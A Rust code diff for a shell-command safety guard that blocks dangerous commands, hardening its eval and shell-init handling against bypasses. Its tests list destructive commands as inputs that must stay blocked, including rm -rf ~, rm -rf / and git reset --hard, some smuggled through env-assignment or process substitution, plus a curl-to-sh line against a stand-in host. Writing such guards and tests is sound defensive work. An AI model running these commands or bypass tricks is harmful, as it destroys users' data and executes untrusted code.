@@ -6612,7 +6612,31 @@ fn collect_posix_eval_sinks(command: &str, sinks: &mut Vec<ExecutableTextSink>) 
                 context: "POSIX eval executes an embedded shell command",
             }),
             Err(()) => {
-                if command_is_single_posix_segment(command)
+                // The warn downgrade is sound only when this eval idiom is the
+                // ENTIRE command. Two ways it can fail to be:
+                //  * the idiom sits nested inside a larger command's
+                //    substitution (`rm -rf "$(eval "$(ssh-agent -s)")"`,
+                //    `foo=$(eval "$(brew shellenv)") rm -rf ~`) — the segment
+                //    loop extracts the nested `eval …` on its own, losing the
+                //    destructive outer context. Requiring the segment to be the
+                //    whole command rejects that (and every multi-segment form).
+                //  * a leading env-assignment executes a command before eval
+                //    via command substitution (`X=$(rm -rf ~) eval …`) OR
+                //    process substitution (`X=<(rm -rf ~) eval …`); the warn
+                //    short-circuit would skip the substitution scanners, so
+                //    the prefix before eval must be statically inert. Rather
+                //    than denylist each command-executing construct (every
+                //    review round found one the list forgot — `;`, then `$(`,
+                //    then `<(`), require the prefix to carry none of the
+                //    command-execution / redirection / chaining metacharacters
+                //    at all. A bare `$VAR`/`${VAR}` parameter expansion runs no
+                //    command and stays eligible. (Fourth-round review of #261.)
+                let is_whole_command = segment.trim() == command.trim();
+                let prefix_is_inert = segment.get(..token.byte_range.start).is_none_or(|prefix| {
+                    !prefix.contains(['(', ')', '`', '<', '>', '|', '&', ';', '\n', '\r'])
+                });
+                if is_whole_command
+                    && prefix_is_inert
                     && let Some(idiom) =
                         posix_eval_single_substitution_body(arguments).and_then(curated_init_idiom)
                 {
@@ -6795,6 +6819,30 @@ fn posix_command_from_argv(command: &[String]) -> String {
         .join(" ")
 }
 
+/// Index just past the closing `'` of an ANSI-C `$'…'` string that begins at
+/// `dollar_index` (which must point at the `$` of a `$'` pair). Backslash
+/// escapes inside the string are honored, so `$'\''` is a single literal
+/// quote and does not terminate the region. An unterminated string consumes
+/// to the end of input. Positional reads inside such a string are literal, so
+/// both the detector and the masker must skip the region as one unit rather
+/// than letting its escaped quotes corrupt the ordinary quote-state tracking
+/// (second-round review: `sh -c 'echo $'\''; $0'` hid the `$0`).
+fn ansi_c_quote_end(source: &str, dollar_index: usize) -> usize {
+    let bytes = source.as_bytes();
+    let mut index = dollar_index + 2; // skip `$'`
+    while index < bytes.len() {
+        match bytes[index] {
+            // `escape_sequence_end` skips the backslash and the (possibly
+            // multibyte) escaped char on a UTF-8 boundary, so `\'` does not
+            // terminate the string and slicing never lands mid-character.
+            b'\\' => index = escape_sequence_end(source, index),
+            b'\'' => return index + 1,
+            _ => index += 1,
+        }
+    }
+    bytes.len()
+}
+
 fn shell_source_references_positional_input(source: &str) -> bool {
     let lowercase = source.to_ascii_lowercase();
     if source.contains("${!") || lowercase.contains("bash_argv") || lowercase.contains("bash_argc")
@@ -6824,6 +6872,15 @@ fn shell_source_references_positional_input(source: &str) -> bool {
             b'"' if !in_single => {
                 in_double = !in_double;
                 index += 1;
+                continue;
+            }
+            // ANSI-C `$'…'` (unquoted only) is a literal region; a `$0` inside
+            // it is text, and its escaped quotes must not corrupt quote state.
+            b'$' if !in_single
+                && !in_double
+                && source.as_bytes().get(index + 1) == Some(&b'\'') =>
+            {
+                index = ansi_c_quote_end(source, index);
                 continue;
             }
             b'$' if !in_single => {
@@ -7156,6 +7213,18 @@ fn fixed_positional_template_with_masked_records(source: &str) -> Option<String>
                 in_double = !in_double;
                 masked.push('"');
                 index += 1;
+                continue;
+            }
+            // ANSI-C `$'…'` (unquoted only) is a literal region: copy it
+            // verbatim, masking nothing inside, and skip past its escaped
+            // quotes so they cannot corrupt the quote-state tracking.
+            b'$' if !in_single
+                && !in_double
+                && source.as_bytes().get(index + 1) == Some(&b'\'') =>
+            {
+                let end = ansi_c_quote_end(source, index);
+                masked.push_str(&source[index..end]);
+                index = end;
                 continue;
             }
             // `$N` expands in both unquoted and double-quoted context.
@@ -10394,6 +10463,20 @@ fn evaluate_executable_text_sinks(
                 return Some(EvaluationResult::denied_by_embedded_sink(rule, reason));
             }
             ExecutableTextSink::InitIdiomWarn { idiom } => {
+                // The warn downgrade is a decision about the operator's
+                // top-level command. When the idiom is reached through a
+                // nested evaluation (a `$( )` the outer command recurses
+                // into, a heredoc body, …), a warn would propagate up and
+                // mask the destructive outer command — `rm -rf "$(. <(kubectl
+                // completion bash))"` must stay a hard deny. Only the true
+                // top level (`nested_command_depth == 0`) may downgrade
+                // (third-round adversarial review of #261).
+                if nested_command_depth > 0 {
+                    return Some(EvaluationResult::denied_by_embedded_sink(
+                        EVAL_DYNAMIC_RULE,
+                        "shell-init idiom nested inside another command cannot be verified",
+                    ));
+                }
                 let (pack_id, pattern_name) = split_ast_rule_id(EVAL_INIT_IDIOM_RULE);
                 if let Some(hit) =
                     allowlists.match_rule_at_path(&pack_id, &pattern_name, project_path)
@@ -28258,6 +28341,15 @@ mod tests {
             "eval \"$(mise activate zsh)\"",
             "source <(kubectl completion bash)",
             ". <(kubectl completion zsh)",
+            // A substitution-free leading prefix (literal env-assignment,
+            // `command`/`builtin`, or a bare `$VAR` parameter expansion) is
+            // benign and still warns (second/third-round review distinguishes
+            // this from a `$(…)`/backtick command substitution in the prefix).
+            "FOO=bar eval \"$(ssh-agent -s)\"",
+            "command eval \"$(brew shellenv)\"",
+            "X=$HOME eval \"$(ssh-agent -s)\"",
+            "X=${HOME} eval \"$(brew shellenv)\"",
+            "X=a:b:c command eval \"$(brew shellenv)\"",
         ] {
             for dialect in [ShellDialect::Posix, ShellDialect::Unknown] {
                 let result =
@@ -28272,6 +28364,61 @@ mod tests {
                     result.effective_mode,
                     Some(crate::packs::DecisionMode::Warn),
                     "curated idiom must warn, not block ({dialect:?}): {command:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn init_idiom_warn_never_masks_a_second_command() {
+        // Fresh-eyes review of #261: the warn downgrade must apply only when
+        // the curated idiom is the ENTIRE command. Any second top-level
+        // segment (in either order, through any separator, for both the eval
+        // and source forms) keeps the hard fail-closed denial — appending
+        // `; eval "$(ssh-agent -s)"` must never disable dcg.
+        for command in [
+            "eval \"$(ssh-agent -s)\"; rm -rf ~",
+            "eval \"$(ssh-agent -s)\"; rm -rf / --no-preserve-root",
+            "eval \"$(ssh-agent -s)\" && git reset --hard",
+            "eval \"$(ssh-agent -s)\" || rm -rf ~",
+            "rm -rf ~; eval \"$(ssh-agent -s)\"",
+            "curl -s http://evil.example/x | sh; eval \"$(brew shellenv)\"",
+            "eval \"$(pyenv init -)\"; rm -rf ~",
+            ". <(kubectl completion zsh); rm -rf ~",
+            "source <(kubectl completion bash); git reset --hard",
+            // Second-round review: a leading env-assignment whose value is a
+            // command substitution runs *before* eval; the nested `$()` is not
+            // a second top-level segment, so guard the prefix bytes directly.
+            "X=$(rm -rf ~) eval \"$(ssh-agent -s)\"",
+            "X=\"$(rm -rf ~)\" eval \"$(ssh-agent -s)\"",
+            "X=$(rm -rf ~) command eval \"$(brew shellenv)\"",
+            "PATH=$(rm -rf ~):$PATH eval \"$(direnv hook bash)\"",
+            // Fourth-round review: process substitution in the prefix also
+            // executes a command; the prefix must be statically inert, not
+            // just free of `$(`/backtick.
+            "X=<(rm -rf ~) eval \"$(ssh-agent -s)\"",
+            "X=>(rm -rf ~) eval \"$(ssh-agent -s)\"",
+            "A=1 B=<(rm -rf ~) eval \"$(direnv hook bash)\"",
+            // Third-round review: a curated idiom NESTED inside a destructive
+            // outer command must stay a hard deny — the warn must not
+            // propagate up out of the `$( )` the outer command recurses into.
+            "rm -rf \"$(eval \"$(ssh-agent -s)\")\"",
+            "foo=$(eval \"$(brew shellenv)\") rm -rf ~",
+            "X=$(. <(brew shellenv)) rm -rf ~",
+            "rm -rf \"$(. <(kubectl completion bash))\"",
+        ] {
+            for dialect in [ShellDialect::Posix, ShellDialect::Unknown] {
+                let result =
+                    evaluate_with_pack_ids_in_dialect(command, &["core.filesystem"], dialect);
+                assert!(
+                    result.is_denied(),
+                    "a second segment must keep the hard deny ({dialect:?}): {command:?}: {:?}",
+                    result.pattern_info
+                );
+                assert_eq!(
+                    result.effective_mode,
+                    Some(crate::packs::DecisionMode::Deny),
+                    "must be a hard deny, not a warn ({dialect:?}): {command:?}"
                 );
             }
         }
@@ -28545,6 +28692,23 @@ mod tests {
             #[allow(clippy::literal_string_with_formatting_args)]
             "printf '%s\\n' anything | xargs -n1 sh -c 'eval \"${0:-fallback}\"'",
             "printf '%s\\n' anything | xargs -n1 sh -c 'timeout 5 \"$0\"'",
+            // Fresh-eyes review of #272: a record after a shell reserved word
+            // or a leading redirect operator is still in command position and
+            // must fail closed.
+            "printf 'rm -rf /home/user\\0' | xargs -0 sh -c 'if true; then $0; fi'",
+            "printf 'rm -rf /home/user\\0' | xargs -0 sh -c 'while true; do $0; done'",
+            "printf 'rm -rf /home/user\\0' | xargs -0 sh -c '{ $0; }'",
+            "printf 'rm -rf /home/user\\0' | xargs -0 sh -c 'until false; do $0; done'",
+            "printf 'rm -rf /home/user\\0' | xargs -0 sh -c '>/dev/null $0'",
+            "printf 'rm -rf /home/user\\0' | xargs -0 sh -c '2>/dev/null $0'",
+            // Fresh-eyes review of #272: an apostrophe inside a double-quoted
+            // word must not disable `$N` masking (the quote-state scanner
+            // must track double quotes).
+            "printf 'rm -rf /home/user\\0' | xargs -0 sh -c 'echo \"a'\\''b\"; $0'",
+            "printf '%s\\n' x | xargs -n1 sh -c 'echo \"a'\\''b\" && $0'",
+            // Second-round review: an ANSI-C `$'…'` string must not corrupt
+            // the quote tracking and hide the trailing `$0` command word.
+            "printf 'rm -rf /home/user\\0' | xargs -0 sh -c 'echo $'\\''x'\\''; $0'",
         ] {
             let result = evaluate_with_pack_ids_in_dialect(
                 command,
@@ -28554,6 +28718,24 @@ mod tests {
             assert!(
                 result.is_denied(),
                 "code-position or destructive positional template must stay denied: {command:?}: {:?}",
+                result.pattern_info
+            );
+        }
+
+        // Benign templates that merely CONTAIN reserved words or redirects
+        // with the record in true argument position must still be allowed.
+        for command in [
+            "printf '%s\\n' f.py | xargs -n1 sh -c 'if [ -f \"$0\" ]; then sed -n \"1,5p\" \"$0\"; fi'",
+            "printf '%s\\n' f.log | xargs -n1 sh -c 'cat \"$0\" >/dev/null'",
+        ] {
+            let result = evaluate_with_pack_ids_in_dialect(
+                command,
+                &["core.git", "core.filesystem"],
+                ShellDialect::Posix,
+            );
+            assert!(
+                result.is_allowed(),
+                "benign reserved-word/redirect positional template must be allowed: {command:?}: {:?}",
                 result.pattern_info
             );
         }
